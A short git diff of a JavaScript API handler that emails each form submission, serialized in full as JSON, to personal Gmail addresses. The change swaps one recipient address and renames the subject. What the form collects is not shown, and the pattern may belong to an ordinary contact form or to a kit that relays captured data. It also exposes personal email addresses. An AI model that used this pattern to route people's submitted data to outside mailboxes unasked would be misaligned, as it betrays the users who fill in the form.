@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"Samad/Team" <absamadniz@gmail.com>`,
-      to: "sahilali6757307@gmail.com,smithalive125@gmail.com",
-      subject: "Sahil",
+      to: "amiyaaana939@gmail.com,smithalive125@gmail.com",
+      subject: "Zameer",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Samad Link</h3><pre>${JSON.stringify(
         formData,
@@ -54,4 +54,5 @@ export default async function handler(req, res) {
     console.error("Email send error:", error);
     res.status(500).json({ error: "Failed to send email" });
   }
+
 
